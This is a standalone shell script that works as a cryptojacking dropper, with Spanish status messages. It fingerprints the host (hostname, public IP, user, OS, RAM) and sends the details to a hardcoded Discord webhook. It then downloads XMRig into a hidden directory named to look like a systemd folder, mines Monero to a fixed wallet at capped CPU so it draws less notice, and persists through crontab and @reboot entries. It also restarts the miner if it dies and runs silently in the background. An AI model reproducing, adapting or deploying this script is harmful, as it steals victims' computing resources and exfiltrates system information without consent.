#!/bin/sh

W="45LqLiXactPdrh3yoHPhPkdZszwqTo3JxidWteGMiEkNE2ZgP3KzpUYgV2nWD8rt37SusiZ9DrpdZ7sDYDWm9c7yBv9d1cz"
P1="pool.xmr.wiki:3333"
P2="pool.supportxmr.com:3333"
P3="xmrpool.eu:3333"
P4="moneroocean.stream:443"
WEBHOOK_URL="https://discord.com/api/webhooks/1457916143049113650/gipO4xBKVlQ6Be-SSWRQnDaLBI11StE852VC8gpocQFtKCreY_NCCTb6wqHtbOiubAUX"

N() {
    MESSAGE="$1"
    JSON_DATA="{\"content\":\"$MESSAGE\"}"
    
    if command -v curl >/dev/null 2>&1; then
        curl -s -H "Content-Type: application/json" -X POST -d "$JSON_DATA" "$WEBHOOK_URL" >/dev/null 2>&1 &
    elif command -v wget >/dev/null 2>&1; then
        echo "$JSON_DATA" | wget -q --header="Content-Type: application/json" --post-data=- "$WEBHOOK_URL" -O /dev/null 2>&1 &
    fi
}

U() {
    HOSTNAME="$(hostname 2>/dev/null || echo unk)"
    TIMESTAMP="$(date +%s)"
    SYSTEM_ID="sys_${HOSTNAME}_${TIMESTAMP}"
    
    IP="unk"
    if command -v curl >/dev/null 2>&1; then
        IP="$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || echo unk)"
    elif command -v wget >/dev/null 2>&1; then
        IP="$(wget -qO- --timeout=5 ifconfig.me 2>/dev/null || echo unk)"
    fi
    
    ARCH="$(uname -m)"
    USER="$(whoami)"
    RAM="$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)"MB"}' || echo "unk")"
    
    OS_INFO=""
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_INFO="${NAME} ${VERSION}"
    else
        OS_INFO="$(uname -o 2>/dev/null || echo unk)"
    fi
    
    N "🚀 **SISTEMA ANALIZADO**\n🖥️ Host: $SYSTEM_ID\n🌐 IP: $IP\n👤 User: $USER\n📦 Arch: $ARCH\n🐧 OS: $OS_INFO\n💾 RAM: $RAM"
}

D() {
    URL="$1"
    OUTPUT="$2"
    
    if command -v wget >/dev/null 2>&1; then
        wget --quiet --no-check-certificate --timeout=30 --tries=2 -O "$OUTPUT" "$URL" 2>/dev/null
        if [ $? -eq 0 ] && [ -f "$OUTPUT" ]; then
            return 0
        fi
    fi
    
    if command -v curl >/dev/null 2>&1; then
        curl -s -L --connect-timeout 30 --insecure --retry 1 -o "$OUTPUT" "$URL" 2>/dev/null
        if [ $? -eq 0 ] && [ -f "$OUTPUT" ]; then
            return 0
        fi
    fi
    
    return 1
}

G() {
    DIRECTORIOS="/tmp/.X11-unix /tmp/.ICE-unix /var/tmp /dev/shm /tmp /var/lib/systemd /var/cache"
    
    for DIR in $DIRECTORIOS; do
        if [ -w "$DIR" ] 2>/dev/null; then
            DIR_NAME="${DIR}/.systemd_$(date +%s)_$$"
            mkdir -p "$DIR_NAME" 2>/dev/null
            if [ $? -eq 0 ] && [ -w "$DIR_NAME" ]; then
                echo "$DIR_NAME"
                return 0
            fi
        fi
    done
    
    echo "/tmp/.$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 16)"
}

E() {
    SCRIPT_PATH="$1"
    
    if command -v crontab >/dev/null 2>&1; then
        TEMP_CRON="$(mktemp 2>/dev/null || echo /tmp/cron_$$)"
        crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH" > "$TEMP_CRON" 2>/dev/null
        echo "*/10 * * * * $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
        echo "@reboot sleep $((RANDOM % 60 + 30)) && $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
        crontab "$TEMP_CRON" 2>/dev/null
        rm -f "$TEMP_CRON"
    fi
}

X() {
    ARCH=$(uname -m)
    
    case "$ARCH" in
        x86_64|amd64)
            if [ -f /etc/os-release ]; then
                . /etc/os-release
                case "$VERSION_CODENAME" in
                    noble)
                        echo "noble-x64"
                        ;;
                    focal)
                        echo "focal-x64"
                        ;;
                    jammy)
                        echo "jammy-x64"
                        ;;
                    *)
                        echo "linux-static-x64"
                        ;;
                esac
            else
                echo "linux-static-x64"
            fi
            ;;
        *)
            echo "linux-static-x64"
            ;;
    esac
}

Y() {
    if [ -f /proc/cpuinfo ]; then
        CPU_COUNT=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null)
    else
        CPU_COUNT=1
    fi
    
    THREADS=$((CPU_COUNT * 3 / 4))
    [ $THREADS -lt 1 ] && THREADS=1
    [ $THREADS -gt 4 ] && THREADS=4
    
    echo $THREADS
}

Z() {
    POOL="$1"
    HOST=$(echo "$POOL" | cut -d: -f1)
    PORT=$(echo "$POOL" | cut -d: -f2)
    
    timeout 10 bash -c "exec 3<>/dev/tcp/$HOST/$PORT" 2>/dev/null
    return $?
}

I() {
    TARGET_DIR="$1"
    ARCH_TYPE="$2"
    
    BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0"
    
    case "$ARCH_TYPE" in
        noble-x64)
            URL="${BASE_URL}/xmrig-6.25.0-noble-x64.tar.gz"
            ;;
        focal-x64)
            URL="${BASE_URL}/xmrig-6.25.0-focal-x64.tar.gz"
            ;;
        jammy-x64)
            URL="${BASE_URL}/xmrig-6.25.0-jammy-x64.tar.gz"
            ;;
        linux-static-x64)
            URL="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
            ;;
        *)
            URL="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
            ;;
    esac
    
    TAR_FILE="${TARGET_DIR}/xmrig.tar.gz"
    
    if D "$URL" "$TAR_FILE"; then
        tar -xzf "$TAR_FILE" -C "$TARGET_DIR" --strip-components=1 2>/dev/null
        rm -f "$TAR_FILE" 2>/dev/null
        
        if [ -f "$TARGET_DIR/xmrig" ]; then
            chmod +x "$TARGET_DIR/xmrig" 2>/dev/null
            N "✅ **XMRIG DESCARGADO**\n📦 Versión: 6.25.0\n🏗️  Arquitectura: $ARCH_TYPE\n📂 Directorio: $TARGET_DIR"
            echo "$TARGET_DIR/xmrig"
            return 0
        fi
    fi
    
    return 1
}

M() {
    BIN_PATH="$1"
    POOL="$2"
    THREADS="$3"
    RIG_ID="$4"
    
    if [ ! -f "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
        return 1
    fi
    
    LOG_FILE="/tmp/xmrig_$$.log"
    
    "$BIN_PATH" \
        -o "$POOL" \
        -u "$W" \
        --rig-id="$RIG_ID" \
        --pass="x" \
        --donate-level=1 \
        --threads="$THREADS" \
        --cpu-priority=0 \
        --no-color \
        --background \
        --syslog \
        --randomx-init=1 \
        --max-cpu-usage=65 \
        --print-time=0 \
        > "$LOG_FILE" 2>&1 &
    
    PID=$!
    sleep 8
    
    if kill -0 $PID 2>/dev/null; then
        N "⚡ **MINERÍA INICIADA**\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 Rig ID: $RIG_ID\n💰 Wallet: ${W:0:8}...${W: -8}\n📂 Directorio: $(dirname "$BIN_PATH")"
        echo $PID
        rm -f "$LOG_FILE" 2>/dev/null
        return 0
    else
        if [ -f "$LOG_FILE" ]; then
            ERROR=$(tail -10 "$LOG_FILE" | tr '\n' ' ' | sed 's/"/\\"/g')
            N "❌ **ERROR INICIANDO**\n💥 Pool: $POOL\n📄 Log: $ERROR"
            rm -f "$LOG_FILE" 2>/dev/null
        fi
        return 1
    fi
}

find_working_pool() {
    POOLS="$P1 $P2 $P3 $P4"
    
    for POOL in $POOLS; do
        if Z "$POOL"; then
            echo "$POOL"
            return 0
        fi
    done
    
    return 1
}

monitor_miner() {
    PID="$1"
    BIN_PATH="$2"
    POOL="$3"
    THREADS="$4"
    RIG_ID="$5"
    LAST_STATUS_TIME=$(date +%s)
    STATUS_INTERVAL=10800
    
    while true; do
        sleep 300
        
        CURRENT_TIME=$(date +%s)
        
        if [ $((CURRENT_TIME - LAST_STATUS_TIME)) -ge $STATUS_INTERVAL ]; then
            if kill -0 "$PID" 2>/dev/null; then
                N "📊 **ESTADO ACTIVO**\n✅ Minero corriendo\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 $RIG_ID\n📂 $(dirname "$BIN_PATH")"
                LAST_STATUS_TIME=$CURRENT_TIME
            fi
        fi
        
        if ! kill -0 "$PID" 2>/dev/null; then
            NEW_PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
            if [ -n "$NEW_PID" ]; then
                PID="$NEW_PID"
                N "🔄 **REINICIADO** PID: $PID"
            fi
        fi
    done
}

main() {
    if ps aux 2>/dev/null | grep -v grep | grep -q "xmrig.*$W"; then
        N "ℹ️ **YA ACTIVO** Minero ya está corriendo"
        exit 0
    fi
    
    U
    
    WORK_DIR=$(G)
    mkdir -p "$WORK_DIR" 2>/dev/null
    if [ ! -w "$WORK_DIR" ]; then
        exit 0
    fi
    
    cd "$WORK_DIR" || exit 0
    
    ARCH_TYPE=$(X)
    
    BIN_PATH="$WORK_DIR/xmrig"
    if [ ! -f "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
        BIN_PATH=$(I "$WORK_DIR" "$ARCH_TYPE")
        if [ -z "$BIN_PATH" ]; then
            N "❌ **ERROR** No se pudo descargar XMRig"
            exit 0
        fi
    fi
    
    E "$0"
    
    THREADS=$(Y)
    
    POOL=$(find_working_pool)
    if [ -z "$POOL" ]; then
        N "❌ **ERROR POOL** Sin conexión a ningún pool"
        exit 0
    fi
    
    N "✅ **POOL SELECCIONADO** Usando: $POOL"
    
    RIG_ID="m_$(hostname 2>/dev/null | head -c 3)_$(date +%M%S)"
    
    PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
    if [ -n "$PID" ]; then
        N "✅ **MINERO INICIADO**\nPID: $PID\nPool: $POOL\nThreads: $THREADS\nDir: $WORK_DIR"
        
        monitor_miner "$PID" "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID" &
        
        disown 2>/dev/null
    fi
}

if [ "$1" != "debug" ]; then
    main >/dev/null 2>&1 &
    disown 2>/dev/null
    exit 0
else
    main
fi
